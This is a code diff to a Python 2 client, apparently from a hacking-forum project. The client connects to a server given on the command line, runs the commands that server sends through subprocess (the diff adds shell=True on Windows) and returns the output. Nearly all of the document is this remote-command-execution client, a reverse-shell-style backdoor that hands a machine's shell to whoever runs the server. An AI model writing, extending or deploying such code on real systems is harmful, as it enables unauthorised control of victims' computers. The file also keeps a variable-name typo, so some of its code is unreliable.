@@ -8,18 +8,20 @@
 # Forum:        http://forum.openfire-security.net
 #
 # Created:     03/09/2013
+# Last_Update: 01/12/2014
 # Copyright:   (c) Xception 2013
 # Licence:     Open Source
 #-------------------------------------------------------------------------------
 
 import socket, sys, subprocess, os
+#from threading import Timer
 
 if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
-	SysClS = 'clear'
+    SysClS = 'clear'
 elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
-	SysCls = 'cls'
+    SysCls = 'cls'
 else:
-	SysCls = 'unknown'
+    SysCls = 'unknown'
 
 os.system(SysCls)
 
@@ -49,22 +51,20 @@ try:
     ip = sys.argv[1]
     port = sys.argv[2]
 except IndexError:
-    print "[=] No enough arguments!"
+    print "[=] Not enough arguments!"
     help()
 
-try:
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((ip, int(port)))
-    print "[+] Connected with server, IP : %s & PORT : %d \n" % (ip, int(port))
-
+def conversation():
     while True:
         try:
-            data =  raw_input("Enter text to send to server : ")
+            data = raw_input("Enter text to send to server : ")
+            if ("%s" % data):
+                sock.send("%s" % data)
         except KeyboardInterrupt:
             print "CTRL^C Pressed, Shutting client"
             sock.close()
             sys.exit()
-        sock.send(data)
+        
         while True:
             data_recv = sock.recv(104448)
 
@@ -80,7 +80,7 @@ try:
                         print "\nSent Command response to server"
                         continue
                     elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
-                        new_data = subprocess.Popen(data_recv[10:],stdout=subprocess.PIPE).communicate()[0]
+                        new_data = subprocess.Popen(data_recv[10:],stdout=subprocess.PIPE, shell=True).communicate()[0]
                         sock.send("\n %s " % new_data)
                         print "\nSent Command response to server"
                         continue
@@ -95,6 +95,15 @@ try:
                 print "\n[+] Server Sent : %s\n" % data_recv
                 break
 
+
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((ip, int(port)))
+    print "[+] Connected with server, IP : %s & PORT : %d \n" % (ip, int(port))
+    #t = Timer(0.01, conversation())
+    #t.start()
+    conversation()
 
 
 
